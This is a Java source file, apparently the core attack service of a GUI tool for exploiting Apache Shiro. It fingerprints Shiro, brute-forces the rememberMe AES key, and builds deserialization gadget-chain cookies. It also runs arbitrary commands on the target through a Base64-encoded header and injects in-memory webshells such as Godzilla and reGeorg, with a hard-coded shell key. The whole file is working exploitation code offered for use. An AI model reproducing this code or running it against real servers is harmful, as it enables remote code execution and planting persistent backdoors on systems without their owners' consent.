
package com.summersec.attack.core;

import cn.hutool.http.HttpRequest;
import cn.hutool.http.Method;
import com.summersec.attack.deser.frame.Shiro;
import com.summersec.attack.deser.payloads.ObjectPayload;
import com.summersec.attack.deser.plugins.servlet.MemBytes;
import com.summersec.attack.deser.plugins.keytest.KeyEcho;
import com.summersec.attack.deser.util.Gadgets;
import com.summersec.attack.entity.ControllersFactory;
import com.summersec.attack.UI.MainController;
import com.summersec.attack.integration.generator.GeneratorFacade;
import com.summersec.attack.integration.generator.model.EchoGenerateRequest;
import com.summersec.attack.integration.generator.model.EchoGenerateResult;
import com.summersec.attack.integration.generator.model.MemshellGenerateRequest;
import com.summersec.attack.integration.generator.model.MemshellGenerateResult;
import com.summersec.attack.utils.AppLogger;
import com.summersec.attack.utils.HttpUtil;
import com.summersec.attack.utils.Utils;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.UnsupportedEncodingException;
import java.net.Proxy;
import java.nio.charset.StandardCharsets;
import java.security.SecureRandom;
import java.util.*;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import javafx.application.Platform;
import javafx.collections.ObservableList;
import javafx.scene.control.TextArea;
import org.apache.commons.lang.StringUtils;
import org.apache.shiro.codec.Base64;

public class AttackService {
    public static Shiro shiro = new Shiro();
    public static int aesGcmCipherType = 0;
    public static Object principal = KeyEcho.getObject();
    public static String cwd = System.getProperty("user.dir");
    public String url;
    public String method;
    public String shiroKeyWord;
    public Integer timeout;
    public static String attackRememberMe = null;
    public static String gadget = null;
    public static String realShiroKey = null;
    public static Map<String, String> globalHeader = null;
    public static String postData = null;
    private final MainController mainController;
    private final GeneratorFacade generatorFacade = new GeneratorFacade();
    public int flagCount = 0;

    public AttackService(String method, String url, String shiroKeyWord, String timeout, Map<String, String> globalHeader, String postData) {
        this.mainController = (MainController)ControllersFactory.controllers.get(MainController.class.getSimpleName());
        this.url = url;
        this.method = method;
        this.timeout = Integer.parseInt(timeout) * 1000;
        this.shiroKeyWord = shiroKeyWord;
        this.globalHeader = globalHeader;
        this.postData = postData;

    }

    public HashMap<String, String> getCombineHeaders(HashMap<String, String> header) {
        HashMap<String, String> combineHeaders = new HashMap();
        if (header != null) {
            combineHeaders.putAll(header);
        }
        if (globalHeader != null) {
            Set<String> keySet = globalHeader.keySet();
            for (String key : keySet) {
                combineHeaders.put(key, globalHeader.get(key));
            }
        }
        return combineHeaders;
    }

    public String headerHttpRequest(HashMap<String, String> header) {
        String result = null;
        HashMap combineHeaders = this.getCombineHeaders(header);
        Proxy proxy = (Proxy)MainController.currentProxy.get("proxy");
        try {
/*            result = cn.hutool.http.HttpUtil.createRequest(Method.valueOf(this.method),this.url).setProxy(proxy).headerMap(combineHeaders,true).setFollowRedirects(false).execute().toString();
            return result;*/
/*            if (result.contains("Host")){
                return result;
            }*/
            if (this.method.equals("GET")) {
                result = cn.hutool.http.HttpUtil.createRequest(Method.valueOf(this.method),this.url).setProxy(proxy).headerMap(combineHeaders,true).setFollowRedirects(false).execute().toString();

            } else {
                String contentType = combineHeaders.containsKey("Content-Type") ? (String) combineHeaders.get("Content-Type") : "application/x-www-form-urlencoded";
                result = HttpUtil.postHttpReuest(this.url, this.postData, "UTF-8", combineHeaders, contentType, this.timeout);
            }
        } catch (Exception var5) {
            this.mainController.logTextArea.appendText(Utils.log(var5.getMessage()));
        }


        return result;
    }

    public String bodyHttpRequest(HashMap<String, String> header, String postString) {
        String result = "";
        HashMap combineHeaders = this.getCombineHeaders(header);
        Proxy proxy = (Proxy)MainController.currentProxy.get("proxy");
        try {

            if (postString.equals("")) {
                result = cn.hutool.http.HttpUtil.createRequest(Method.valueOf(this.method),this.url).setProxy(proxy).headerMap(combineHeaders,true).setFollowRedirects(false).execute().toString();
                if (result.contains("Host")){
                    return result;
                }
                result = HttpUtil.getHttpReuest(this.url, this.timeout, "UTF-8", combineHeaders);
            } else if (!result.contains("Host") | !this.method.equals("GET")) {
                result = HttpUtil.postHttpReuest(this.url, postString, "UTF-8", combineHeaders, "application/x-www-form-urlencoded", this.timeout);
            }
        } catch (Exception var6) {
            this.mainController.logTextArea.appendText(Utils.log(var6.getMessage()));
        }

        return result;
    }

    public List<String> getALLShiroKeys() {
        ArrayList shiroKeys = new ArrayList();

        try {
            List<String> array = new ArrayList(Arrays.asList(cwd, "data", "shiro_keys.txt"));
            File shiro_file = new File(StringUtils.join(array, File.separator));
            BufferedReader br = new BufferedReader(new InputStreamReader(new FileInputStream(shiro_file), "UTF-8"));

            try {
                String line;
                try {
                    while((line = br.readLine()) != null) {
                        shiroKeys.add(line);
                    }
                } catch (IOException var10) {
                    var10.printStackTrace();
                }
            } finally {
                if (br != null) {
                    br.close();
                }

            }
        } catch (Exception var12) {
            String message = var12.getMessage();
            System.out.println(message);
        }

        return shiroKeys;
    }

    public List<String> generateGadgetEcho(ObservableList gadgetItems, ObservableList echoesItems) {
        List<String> targets = new ArrayList();

        for(int i = 0; i < gadgetItems.size(); ++i) {
            for(int j = 0; j < echoesItems.size(); ++j) {
                System.out.println();
                System.out.println(echoesItems.get(j));
                targets.add(gadgetItems.get(i) + ":" + echoesItems.get(j));
            }
        }

        return targets;
    }

    public boolean gadgetCrack(String gadgetOpt, String echoOpt, String spcShiroKey) {
        boolean flag = false;

        try {
            String rememberMe = this.GadgetPayload(gadgetOpt, echoOpt, spcShiroKey);
            if (rememberMe != null) {
                HashMap header = new HashMap();
                header.put("Cookie", rememberMe + ";");
//                header.put("Host", "08fb41620aa4c498a1f2ef09bbc1183c");
                String result = this.headerHttpRequest(header);
                if (result.contains("Host")) {
                    Platform.runLater(() -> {
                        this.mainController.logTextArea.appendText(Utils.log("[++] 发现构造链:" + gadgetOpt + "  回显方式: " + echoOpt));
                        this.mainController.logTextArea.appendText(Utils.log("[++] 请尝试进行功能区利用。"));
                        this.mainController.gadgetOpt.setValue(gadgetOpt);
                        this.mainController.echoOpt.setValue(echoOpt);
                    });
                    gadget = gadgetOpt;
                    attackRememberMe = rememberMe;
                    flag = true;
                } else {
                    Platform.runLater(() -> this.mainController.logTextArea.appendText(Utils.log("[-] 测试:" + gadgetOpt + "  回显方式: " + echoOpt)));
                }
            } else {
                Platform.runLater(() -> this.mainController.logTextArea.appendText(Utils.log("[-] 测试:" + gadgetOpt + "  回显方式: " + echoOpt + " -> payload 构造失败")));
            }
        } catch (Throwable var8) {
            String msg = var8.getMessage();
            if (msg == null || msg.trim().isEmpty()) {
                msg = var8.getClass().getName();
            }
            AppLogger.error("gadgetCrack 异常: gadget=" + gadgetOpt + ", echo=" + echoOpt + ", msg=" + msg, var8);
            final String finalMsg = msg;
            Platform.runLater(() -> this.mainController.logTextArea.appendText(Utils.log("[-] 测试:" + gadgetOpt + "  回显方式: " + echoOpt + " -> " + finalMsg)));
        }

        return flag;
    }

    public String GadgetPayload(String gadgetOpt, String echoOpt, String spcShiroKey) {
        String rememberMe = null;

        try {
            Class<? extends ObjectPayload> gadgetClazz = resolvePayloadClass(gadgetOpt);
            if (gadgetClazz == null) {
                Platform.runLater(() -> this.mainController.logTextArea.appendText(Utils.log("未找到利用链类: " + gadgetOpt)));
                return null;
            }
            ObjectPayload<?> gadgetPayload = (ObjectPayload)gadgetClazz.newInstance();
            Object template = Gadgets.createTemplatesImpl(echoOpt);
            Object chainObject = gadgetPayload.getObject(template);
            rememberMe = shiro.sendpayload(chainObject, this.shiroKeyWord, spcShiroKey);
        } catch (Throwable var9) {
            var9.printStackTrace();
            String msg = var9.getMessage();
            if (msg == null || msg.trim().isEmpty()) {
                msg = var9.getClass().getName();
            }
            AppLogger.error("GadgetPayload 异常: gadget=" + gadgetOpt + ", echo=" + echoOpt + ", msg=" + msg, var9);
            final String finalMsg = msg;
            Platform.runLater(() -> this.mainController.logTextArea.appendText(Utils.log(finalMsg)));
        }

        return rememberMe;
    }

    private Class<? extends ObjectPayload> resolvePayloadClass(String gadgetOpt) {
        if (gadgetOpt == null || gadgetOpt.trim().isEmpty()) {
            return null;
        }
        String className = gadgetOpt.substring(0, 1).toUpperCase() + gadgetOpt.substring(1);
        try {
            return (Class<? extends ObjectPayload>) Class.forName("com.summersec.attack.deser.payloads." + className);
        } catch (Throwable ignored) {
            return null;
        }
    }

    public void simpleKeyCrack(String shiroKey) {
        try {
            List<String> tempList = new ArrayList();
            tempList.add(shiroKey);
            if (flagCount ==1){
                this.keyTestTask(tempList);
            }
            else{
                this.keyTestTask2(tempList);}

        } catch (Exception var3) {
            this.mainController.logTextArea.appendText(Utils.log(var3.getMessage()));
        }

    }

    public boolean verifyKey(String shiroKey) {
        try {
            if (shiroKey == null || shiroKey.trim().isEmpty()) {
                return false;
            }
            String rememberMe = AttackService.shiro.sendpayload(AttackService.principal, this.shiroKeyWord, shiroKey);
            HashMap<String, String> header = new HashMap();
            header.put("Cookie", rememberMe);
            String result = this.headerHttpRequest(header);
            if (result == null || result.isEmpty()) {
                return false;
            }
            if (this.flagCount <= 1) {
                return !result.contains("=deleteMe");
            }
            return countDeleteMe(result) < this.flagCount;
        } catch (Exception ignored) {
            return false;
        }
    }

    public void keysCrack() {
        try {
            List<String> shiroKeys = this.getALLShiroKeys();
            if (flagCount ==1){
                this.keyTestTask(shiroKeys);
            }
            else {
                //多个shiro场景的爆破key方式
                this.keyTestTask2(shiroKeys);
                this.mainController.logTextArea.appendText(Utils.log("[++] 含有多个shiro场景"));
            }
        } catch (Exception var2) {
            this.mainController.logTextArea.appendText(Utils.log(var2.getMessage()));
        }

    }

    public boolean checkIsShiro() {
        boolean flag = false;

        try {
            HashMap<String, String> header = new HashMap();
            header.put("Cookie", this.shiroKeyWord + "=yes");
            String result = this.headerHttpRequest(header);
//            System.out.println(result);
            flag = result.contains("=deleteMe");

//            if (!flag){
//                flag = result.contains(shiroKeyWord);
//                flag = true;
//            }
            if (flag) {
                this.mainController.logTextArea.appendText(Utils.log("[++] 存在shiro框架！"));
                flag = true;
                flagCount = countDeleteMe(result);


            } else {
//               再次确认shiro
                HashMap<String, String> header1 = new HashMap();
                header1.put("Cookie", this.shiroKeyWord + "=" + AttackService.getRandomString(10));
                String result1 = this.headerHttpRequest(header1);
                flag = result1.contains("=deleteMe");
//                if (!flag){
//                    result1.contains(shiroKeyWord);
//                    flag = true;
//                }
                if(flag){
                    this.mainController.logTextArea.appendText(Utils.log("[++] 存在shiro框架！"));
                    flag = true;
                    flagCount = countDeleteMe(result);

                }else {

                    this.mainController.logTextArea.appendText(Utils.log("[-] 未发现shiro框架！"));

                }
            }
        } catch (Exception var4) {
            if (var4.getMessage() != null) {
                this.mainController.logTextArea.appendText(Utils.log(var4.getMessage()));
            }
        }

        return flag;
    }

    public static String getRandomString(int length){
        String str="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        SecureRandom random= new SecureRandom();
        StringBuffer sb=new StringBuffer();
        for(int i=0;i<length;i++){
            int number=random.nextInt(62);
            sb.append(str.charAt(number));
        }
        return sb.toString();
    }
    //计算包含几个deleteMe
    public int countDeleteMe(String text){
        // 根据指定的字符构建正则
        Pattern pattern = Pattern.compile("deleteMe");
        // 构建字符串和正则的匹配
        Matcher matcher = pattern.matcher(text);
        int count = 0;
        // 循环依次往下匹配
        while (matcher.find()){ // 如果匹配,则数量+1
            count++;
        }
        return  count;

    }
    public void keyTestTask(final List<String> shiroKeys) {
        Thread thread = new Thread(new Runnable() {
            public void run() {
                try {
                    for(int i = 0; i < shiroKeys.size(); ++i) {
                        String shirokey = (String)shiroKeys.get(i);

                        try {
                            String rememberMe = AttackService.shiro.sendpayload(AttackService.principal, AttackService.this.shiroKeyWord, (String)shiroKeys.get(i));
                            HashMap<String, String> header = new HashMap();
                            header.put("Cookie", rememberMe);
                            String result = AttackService.this.headerHttpRequest(header);
                            Thread.sleep(100L);
                            if (result!=null &&!result.isEmpty()&&!result.contains("=deleteMe")) {
                                final String foundKey = shirokey;
                                Platform.runLater(() -> {
                                    AttackService.this.mainController.logTextArea.appendText(Utils.log("[++] 找到key：" + foundKey));
                                    AttackService.this.mainController.shiroKey.setText(foundKey);
                                });
                                AttackService.realShiroKey = shirokey;
                                break;
                            }

                            final String failKey1 = shirokey;
                            Platform.runLater(() -> AttackService.this.mainController.logTextArea.appendText(Utils.log("[-] " + failKey1)));
                        } catch (Exception var6) {
                            final String failKey2 = shirokey;
                            final String errMsg1 = var6.getMessage();
                            Platform.runLater(() -> AttackService.this.mainController.logTextArea.appendText(Utils.log("[-] " + failKey2 + " " + errMsg1)));
                        }

                    }
                    Platform.runLater(() -> AttackService.this.mainController.logTextArea.appendText(Utils.log("[+] 爆破结束")));

                } catch (Exception var7) {
                    throw var7;
                }
            }
        });
        thread.start();
    }

    public void keyTestTask2(final List<String> shiroKeys) {
        Thread thread = new Thread(new Runnable() {
            public void run() {
                try {
                    for(int i = 0; i < shiroKeys.size(); ++i) {
                        String shirokey = (String)shiroKeys.get(i);

                        try {
                            String rememberMe = AttackService.shiro.sendpayload(AttackService.principal, AttackService.this.shiroKeyWord, (String)shiroKeys.get(i));
                            HashMap<String, String> header = new HashMap();
                            header.put("Cookie", rememberMe);
                            String result = AttackService.this.headerHttpRequest(header);
                            Thread.sleep(100L);
                            if (result!=null &&!result.isEmpty()&&countDeleteMe(result)<flagCount) {
                                final String foundKey = shirokey;
                                Platform.runLater(() -> {
                                    AttackService.this.mainController.logTextArea.appendText(Utils.log("[++] 找到key：" + foundKey));
                                    AttackService.this.mainController.shiroKey.setText(foundKey);
                                });
                                AttackService.realShiroKey = shirokey;
                                break;
                            }

                            final String failKey1 = shirokey;
                            Platform.runLater(() -> AttackService.this.mainController.logTextArea.appendText(Utils.log("[-] " + failKey1)));
                        } catch (Exception var6) {
                            final String failKey2 = shirokey;
                            final String errMsg2 = var6.getMessage();
                            Platform.runLater(() -> AttackService.this.mainController.logTextArea.appendText(Utils.log("[-] " + failKey2 + " " + errMsg2)));
                        }

                    }
                    Platform.runLater(() -> AttackService.this.mainController.logTextArea.appendText(Utils.log("[+] 爆破结束")));

                } catch (Exception var7) {
                    throw var7;
                }
            }
        });
        thread.start();
    }
    public String execCmdTask(String command) {
        HashMap<String, String> header = new HashMap();
        header.put("Cookie", attackRememberMe);
        String b64Command = Base64.encodeToString(command.getBytes(StandardCharsets.UTF_8));
        header.put("Authorization", "Basic " + b64Command);
        AppLogger.info("执行命令请求: command=" + command);
        String responseText = this.bodyHttpRequest(header, "");
        if (responseText == null) {
            AppLogger.warn("命令执行返回为空响应");
            return null;
        }
        if (!responseText.contains("$$$")) {
            AppLogger.warn("命令执行返回非命令格式，按原始文本输出，长度=" + responseText.length());
            return responseText;
        }
        String[] parts = responseText.split("\\$\\$\\$");
        if (parts.length < 2) {
            AppLogger.warn("命令执行返回分段不足，按原始文本输出，长度=" + responseText.length());
            return responseText;
        }
        String result = parts[1];
        if (result.equals("")) {
            AppLogger.info("命令执行成功但返回为空: command=" + command);
            return "";
        }
        byte[] b64bytes = Base64.decode(result);
        try {
            String defaultEncode = Utils.guessEncoding(b64bytes);
            String decoded = new String(b64bytes, defaultEncode);
            AppLogger.info("命令执行成功: command=" + command + ", responseEncoding=" + defaultEncode + ", responseLength=" + decoded.length());
            return decoded;
        } catch (UnsupportedEncodingException var8) {
            String decoded = new String(b64bytes, StandardCharsets.UTF_8);
            AppLogger.warn("命令执行结果编码探测失败，已回退 UTF-8: command=" + command);
            return decoded;
        }
    }

    public void injectMem(String memShellType, String shellPass, String shellPath) {
        injectMem(memShellType, shellPass, shellPath, null);
    }

    public void injectMem(String memShellType, String shellPass, String shellPath, TextArea outputSink) {
        TextArea logArea = outputSink != null ? outputSink : this.mainController.InjOutputArea;
        boolean changeKeyMode = outputSink != null;
        String injectRememberMe = this.GadgetPayload(gadget, "InjectMemTool", realShiroKey);
        if (injectRememberMe != null) {
            HashMap<String, String> header = new HashMap();
            header.put("Cookie", injectRememberMe);
            header.put("p", shellPass);
            header.put("path", shellPath);

            try {
                String b64Bytecode = MemBytes.getBytes(memShellType);
                String postString = "user=" + b64Bytecode;
                String result = this.bodyHttpRequest(header, postString);
                if (result.contains("->|Success|<-") || result.contains("->|change key ok|<-")) {
                    String httpAddress = Utils.UrlToDomain(this.url);
                    if (changeKeyMode || result.contains("->|change key ok|<-")) {
                        logArea.appendText(Utils.log("[修改结果] 成功"));
                        logArea.appendText(Utils.log("[新 Key] " + shellPass));
                    } else {
                        logArea.appendText(Utils.log("[注入结果] 成功"));
                        logArea.appendText(Utils.log("[类型] " + memShellType));
                    }
                    if (!changeKeyMode && shellPath != null && !shellPath.isEmpty()) {
                        logArea.appendText(Utils.log("[路径] " + httpAddress + shellPath));
                    }
                    if (!changeKeyMode && !result.contains("->|change key ok|<-") && memShellType.contains("哥斯拉")) {
                        logArea.appendText(Utils.log("[密码] " + shellPass));
                        logArea.appendText(Utils.log("[密钥] 3c6e0b8a9c15224a"));
                        logArea.appendText(Utils.log("[加密方式] AES"));
                    } else if (!changeKeyMode && !result.contains("->|change key ok|<-") && !memShellType.equals("reGeorg[Servlet]") && !memShellType.equals("reGeorg[Filter]")) {
                        logArea.appendText(Utils.log("[密码] " + shellPass));
                    }
                    if (!changeKeyMode && !result.contains("->|change key ok|<-") && memShellType.contains("NeoreGeorg")) {
                        logArea.appendText(Utils.log("[提示] NeoreGeorg 使用自定义 Base64 字母表，请使用本工具配套的 NeoreGeorg 客户端连接"));
                    }
                } else {
                    if (result.contains("->|") && result.contains("|<-")) {
                        logArea.appendText(Utils.log("[服务端响应] " + result));
                    }

                    String httpAddress = Utils.UrlToDomain(this.url);
                    boolean alreadyExists = result.contains("Filter already exists") || result.contains("Servlet already exists");
                    if (alreadyExists) {
                        logArea.appendText(Utils.log("[注入结果] 已存在，目标可能已经注入成功"));
                        if (!changeKeyMode && shellPath != null && !shellPath.isEmpty()) {
                            logArea.appendText(Utils.log("[路径] " + httpAddress + shellPath));
                        }
                        if (!changeKeyMode && memShellType.contains("哥斯拉")) {
                            logArea.appendText(Utils.log("[密码] " + shellPass));
                            logArea.appendText(Utils.log("[密钥] 3c6e0b8a9c15224a"));
                            logArea.appendText(Utils.log("[加密方式] AES"));
                        } else if (!changeKeyMode && !memShellType.equals("reGeorg[Servlet]") && !memShellType.equals("reGeorg[Filter]")) {
                            logArea.appendText(Utils.log("[密码] " + shellPass));
                        }
                        if (!changeKeyMode && memShellType.contains("NeoreGeorg")) {
                            logArea.appendText(Utils.log("[提示] NeoreGeorg 使用自定义 Base64 字母表，请使用本工具配套的 NeoreGeorg 客户端连接"));
                        }
                    } else {
                        if (changeKeyMode) {
                            logArea.appendText(Utils.log("[修改结果] 失败，请检查当前利用链、目标环境或重试其他变体"));
                        } else {
                            logArea.appendText(Utils.log("[注入结果] 失败，请更换注入类型或者更换新路径"));
                        }
                    }
                }
            } catch (Exception var10) {
                logArea.appendText(Utils.log("[异常] " + var10.getMessage()));
            }

            logArea.appendText(Utils.log("-------------------------------------------------"));
        }

    }

    public EchoGenerateResult generateEchoWithThirdParty(String source, String serverType, String modelType, String formatType,
                                                         String legacyGadget, String legacyEcho, String shiroKey) {
        try {
            if (source == null || source.trim().isEmpty()) {
                source = "Legacy";
            }
            if ("Legacy".equalsIgnoreCase(source)) {
                String rememberMe = this.GadgetPayload(legacyGadget, legacyEcho, shiroKey);
                if (rememberMe == null || rememberMe.isEmpty()) {
                    return EchoGenerateResult.fail("Legacy", "Legacy 回显构造失败");
                }
                return EchoGenerateResult.ok("Legacy", rememberMe, "Cookie");
            }

            EchoGenerateRequest request = new EchoGenerateRequest();
            request.setServerType(serverType);
            request.setModelType(modelType);
            request.setFormatType(formatType);
            request.setRequestHeaderName("User-Agent");
            request.setRequestHeaderValue("Mozilla/5.0");
            EchoGenerateResult result = generatorFacade.generateEcho(source, request)
                    .withSelection(serverType, modelType, formatType);
            if (!result.isSuccess()) {
                String rememberMe = this.GadgetPayload(legacyGadget, legacyEcho, shiroKey);
                if (rememberMe != null && !rememberMe.isEmpty()) {
                    this.mainController.logTextArea.appendText(Utils.log("[!] 第三方 Echo 生成失败，已自动回退 Legacy"));
                    return EchoGenerateResult.ok("Legacy", rememberMe, "Cookie");
                }
            }
            return result;
        } catch (Exception e) {
            return EchoGenerateResult.fail(source, e.getMessage());
        }
    }

    public MemshellGenerateResult generateMemshellWithThirdParty(String source, String toolType, String serverType,
                                                                 String shellType, String formatType,
                                                                 String gadgetType, String legacyMemshellOption) {
        try {
            if (source == null || source.trim().isEmpty()) {
                source = "Legacy";
            }
            MemshellGenerateRequest request = new MemshellGenerateRequest();
            request.setToolType(toolType);
            request.setServerType(serverType);
            request.setShellType(shellType);
            request.setFormatType(formatType);
            request.setGadgetType(gadgetType);
            request.setOption(legacyMemshellOption);
            MemshellGenerateResult result = generatorFacade.generateMemshell(source, request)
                    .withSelection(toolType, serverType, shellType, formatType, gadgetType);
            if (!result.isSuccess() && !"Legacy".equalsIgnoreCase(source)) {
                String fallbackMessage = result.getMessage();
                this.mainController.logTextArea.appendText(Utils.log("[!] 第三方 Memshell 生成失败，已自动回退 Legacy"));
                this.mainController.logTextArea.appendText(Utils.log("[!] 第三方 Memshell 参数: server=" + serverType + ", tool=" + toolType + ", shell=" + shellType + ", format=" + formatType + ", gadget=" + gadgetType));
                if (fallbackMessage != null && !fallbackMessage.trim().isEmpty()) {
                    this.mainController.logTextArea.appendText(Utils.log("[!] 第三方 Memshell 原始错误: " + fallbackMessage));
                }
                MemshellGenerateResult legacyResult = generatorFacade.generateMemshell("Legacy", request)
                        .withSelection(toolType, serverType, shellType, formatType, gadgetType);
                if (legacyResult.isSuccess()) {
                    return MemshellGenerateResult.okWithFallback(
                            legacyResult.getSource(),
                            legacyResult.getPayload(),
                            legacyResult.getBasicInfo(),
                            legacyResult.getDebugInfo(),
                            source,
                            fallbackMessage
                    ).withSelection(toolType, serverType, shellType, formatType, gadgetType);
                }
                return legacyResult;
            }
            return result;
        } catch (Exception e) {
            return MemshellGenerateResult.fail(source, e.getMessage());
        }
    }

    public static void main(String[] args) {
    }
}
